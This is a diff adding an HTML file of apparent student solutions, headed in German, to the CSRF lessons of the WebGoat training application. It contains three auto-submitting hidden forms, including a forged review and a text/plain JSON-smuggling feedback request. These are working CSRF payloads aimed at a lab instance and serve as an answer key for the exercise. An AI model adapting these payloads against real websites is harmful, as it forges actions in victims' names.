@@ -1,0 +1,36 @@
+<strong>
+    Geben Sie hier Ihre Lösungen zu CSRF ein.
+</strong>
+<br/>3. 47480
+<xmp>
+<form 
+name="form1" 
+action="http://10.10.10.10:8088/WebGoat/csrf/basic-get-flag" 
+method="POST">  
+     <input type="hidden" name='csrf' value='true'>  
+</form>  
+<script>document.form1.submit();</script> 
+</xmp>
+4.
+<xmp>
+<form 
+name="form2" 
+action="http://10.10.10.10:8088/WebGoat/csrf/review" 
+method="POST">  
+     <input type="hidden" name='reviewText' value='Hallo test test'>  
+     <input type="hidden" name='stars' value='1'>  
+     <input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'>  
+</form>  
+<script>document.form2.submit();</script>  
+</xmp>
+7.
+<xmp>
+<form name="form3" 
+enctype="text/plain" 
+action="http://10.10.10.10:8088/WebGoat/csrf/feedback/message" 
+method="POST">  
+    <input type="hidden" 
+    name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!"}'>  
+</form>  
+<script>document.form3.submit();</script>
+</xmp>
